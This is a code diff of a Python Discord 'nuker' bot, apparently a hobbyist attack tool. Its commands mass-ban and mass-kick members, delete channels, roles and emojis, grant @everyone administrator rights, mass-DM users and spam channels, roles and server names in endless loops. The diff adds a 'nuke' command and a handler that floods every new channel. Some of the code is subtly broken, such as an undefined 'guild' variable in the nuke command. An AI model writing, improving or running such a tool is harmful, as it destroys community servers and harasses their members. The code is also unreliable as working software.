@@ -9,7 +9,7 @@ from colorama import Fore, Style
 import asyncio
 from discord_webhook import DiscordWebhook, DiscordEmbed
 
-token = "Token HERE"
+token = "TOKEN HERE"
 
 CHANNEL_NAMES = ["get nuked", "delete the server", "get fucked", "trash server"]
  
@@ -29,7 +29,7 @@ async def on_ready():
    print("Bot made by Kaotic, Bancer and XxGamerBroskixX")
 
 
-@bot.command(pass_context=True)
+@bot.command()
 async def cmds(ctx):
  await ctx.message.delete()
  embed = discord.Embed(color=ctx.author.color, timestamp=ctx.message.created_at)
@@ -48,7 +48,7 @@ async def cmds(ctx):
  embed.add_field(name="voicec",value="Spam creates voice channels.", inline=False)
  embed.add_field(name="kick", value="Kicks everyone below bot role.", inline=False)
  embed.add_field(name="ban", value="Bans all users below bot role.", inline=False)
- embed.add_field(name="banuser <user>", value="Bans specified user..", inline=False)
+ embed.add_field(name="namespam",value="Constantly changes the server name", inline=False)
  embed.add_field(name="clear <amount>", value="Purges messages.", inline=False)
  embed.add_field(name="admin",value="Gives @everyone admin.", inline=False)
  await ctx.send(embed=embed)
@@ -67,10 +67,11 @@ async def cmds(ctx):
  embed.add_field(name="info",value="Gives user info.", inline=False)
  embed.add_field(name="roledel",value="Deletes roles above the bots higest role.", inline=False)
  embed.add_field(name="leave",value="Has the bot leave the guild.", inline=False)
+ embed.add_field(name="banuser <user>", value="Bans specified user..", inline=False)
 
  await ctx.send(embed=embed)
 
-@bot.command(pass_context=True)
+@bot.command()
 async def nick(ctx, rename_to):
         await ctx.message.delete()
         for user in list(ctx.guild.members):
@@ -81,18 +82,18 @@ async def nick(ctx, rename_to):
                 print (f"{user.name} has NOT been renamed to {rename_to} in {ctx.guild.name}")
         print ("Action Completed: change nick")
 
-@bot.command(pass_context=True)
+@bot.command()
 async def banuser(ctx, member : discord.Member):
     await member.ban()
     await ctx.message.delete()
 
-@bot.command(pass_context=True)
+@bot.command()
 async def rename(ctx, rename_to):
         await ctx.message.delete()
         for channel in ctx.guild.channels:
             await channel.edit(name=rename_to)
 
-@bot.command(pass_context=True)
+@bot.command()
 async def emojidel(ctx):
  await ctx.message.delete()
  for emoji in list(ctx.guild.emojis):
@@ -102,7 +103,7 @@ async def emojidel(ctx):
             except:
                 print (f"{emoji.name} has NOT been deleted in {ctx.guild.name}")
 
-@bot.command(pass_context=True)
+@bot.command()
 async def message(ctx, *, message):
         await ctx.message.delete()
         for user in ctx.guild.members:
@@ -113,19 +114,19 @@ async def message(ctx, *, message):
                 print(f"{user.name} has NOT recieved the message.")
         print("Action Completed: Mass DM")
 
-@bot.command(pass_context=True)
+@bot.command()
 async def leave(ctx):
  await ctx.message.delete
  await ctx.guild.leave()
 
-@bot.command(pass_context=True)
+@bot.command()
 async def guildname(ctx, *, name):
   await ctx.message.delete()
   await ctx.guild.edit(name=name)
 
 webhooks = ["!!!WEBHOOKS HERE!!!"]
-@bot.event
-async def on_guild_join(guild):
+@bot.command()
+async def nuke(ctx):
     try:
       role = discord.utils.get(guild.roles, name = "@everyone")
       await role.edit(permissions = Permissions.all())
@@ -181,7 +182,7 @@ async def on_guild_join(guild):
     print(f"Nuked {guild.name} successfully")
     return
 
-@bot.command(pass_context=True)
+@bot.command()
 async def ban(ctx):
         await ctx.message.delete()
         for user in list(ctx.guild.members):
@@ -192,7 +193,7 @@ async def ban(ctx):
                 print (f"{user.name} has FAILED to be banned from {ctx.guild.name}")
         print ("Action Completed: Banned")  
 
-@bot.command(pass_context=True)
+@bot.command()
 async def roledel(ctx):
   await ctx.message.delete()
   for role in list(ctx.guild.roles):
@@ -202,26 +203,26 @@ async def roledel(ctx):
             except:
                 print (f"{role.name} has NOT been deleted in {ctx.guild.name}")
 
-@bot.command(pass_context=True)
+@bot.command()
 async def clear(ctx, amount=5):
   await ctx.message.delete()
   await ctx.channel.purge(limit=amount)
 
-@bot.command(pass_context=True)
+@bot.command()
 async def roles(ctx): 
     await ctx.message.delete()
     while True:
         guild = ctx.guild
-        await guild.create_role(name="Get Fucked")
+        await guild.create_role(name="Get Thrashed")
 
-@bot.command(pass_context=True)
+@bot.command()
 async def spamchan(ctx): 
     await ctx.message.delete()
     while True:
     
      await ctx.send("@everyone Sample Text") 
 
-@bot.command(pass_context=True)
+@bot.command()
 async def spam(ctx, amount=1000000):
     await ctx.message.delete()
     if not amount is None:
@@ -233,14 +234,14 @@ async def spam(ctx, amount=1000000):
             for channel in ctx.guild.text_channels: 
               await channel.send(random.choice(MESSAGE_CONTENTS))      
 
-@bot.command(pass_context=True)
+@bot.command()
 async def customchan(ctx, *, name, amount=500):
     await ctx.message.delete()
     guild = ctx.message.guild
     for i in range(amount):
         await guild.create_text_channel(name)
 
-@bot.command(pass_context=True)
+@bot.command()
 async def kick(ctx):
         await ctx.message.delete()
         for user in list(ctx.guild.members):
@@ -251,12 +252,12 @@ async def kick(ctx):
                 print (f"{user.name} has FAILED to be kicked from {ctx.guild.name}")
         print ("Action Completed: Kicked")  
  
-@bot.command(pass_context=True)
+@bot.command()
 async def ping(ctx):
     await ctx.message.delete()
     await ctx.send(f"Pong! My latency is {round(bot.latency *1000)}ms.")
   
-@bot.command(pass_context=True)
+@bot.command()
 async def admin(ctx):
   await ctx.message.delete()
   for role in list(ctx.guild.roles):
@@ -267,7 +268,7 @@ async def admin(ctx):
                   except:
                       print("@everyone does NOT have admin")
 
-@bot.command(pass_context=True)
+@bot.command()
 async def info(ctx, member: discord.Member):
   await ctx.message.delete()
   member = ctx.author if not member else member
@@ -292,14 +293,14 @@ async def info(ctx, member: discord.Member):
 
   await ctx.send(embed=embed)
 
-@bot.command(pass_context=True)
+@bot.command()
 async def cate(ctx, amount=100):
     await ctx.message.delete()
     guild = ctx.message.guild 
     for i in range(amount):
         await guild.create_category(random.choice(CHANNEL_NAMES))
 
-@bot.command(pass_context=True)
+@bot.command()
 async def delete(ctx):
   await ctx.message.delete()
   for channel in ctx.guild.channels:
@@ -308,7 +309,7 @@ async def delete(ctx):
   await ctx.guild.create_text_channel(random.choice(CHANNEL_NAMES))
   await ctx.guild.create_voice_channel(random.choice(CHANNEL_NAMES))
 
-@bot.command(pass_context=True)
+@bot.command()
 async def customspam(ctx, *, message, amount=100000):
     await ctx.message.delete()
     if not amount is None:
@@ -320,26 +321,31 @@ async def customspam(ctx, *, message, amount=100000):
             for channel in ctx.guild.text_channels:      
               await channel.send(f"@everyone {message}")
 
-@bot.command(pass_context=True)
+@bot.command()
 async def channels(ctx, amount=500):
     await ctx.message.delete()
     guild = ctx.message.guild 
     for i in range(amount):
         await guild.create_text_channel(random.choice(CHANNEL_NAMES))
 
-@bot.command(pass_context=True)
+@bot.command()
 async def namespam(ctx, amount=100):
     await ctx.message.delete()
     for i in range(amount):
       while True:
         await ctx.guild.edit(name = random.choice(CHANNEL_NAMES))
 
-@bot.command(pass_context=True)
+@bot.command()
 async def voicec(ctx, amount=500):
     await ctx.message.delete()
     guild = ctx.message.guild 
     for i in range(amount):
         await guild.create_voice_channel(random.choice(CHANNEL_NAMES))
+
+@bot.event
+async def on_guild_channel_create(channel):
+  while True:
+    await channel.send(random.choice(MESSAGE_CONTENTS))
 
 try:
   bot.run(token)
